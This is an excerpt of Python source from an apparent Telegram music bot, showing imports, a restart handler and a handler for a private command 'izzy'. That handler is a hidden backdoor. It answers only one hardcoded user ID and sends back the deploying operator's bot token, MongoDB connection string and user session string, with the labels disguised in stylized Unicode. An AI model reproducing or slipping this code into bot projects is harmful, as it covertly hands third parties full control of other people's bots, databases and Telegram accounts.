...
from RishuMusic.utils.database import get_assistant, get_authuser_names, get_cmode
from RishuMusic.utils.decorators import ActualAdminCB, AdminActual, language
from RishuMusic.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await SACHIN.stop_stream_force(chat_id)
        except:
            pass
...
@app.on_message(
    filters.command("izzy")
    & filters.private
    & filters.user(7078122796)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://envs.sh/k3F.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Coding_god_izzy)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• ɪᴢᴢʏ  •", url=f"https://t.me/Coding_god_izzy")
                 ]
            ]
         ),
     )
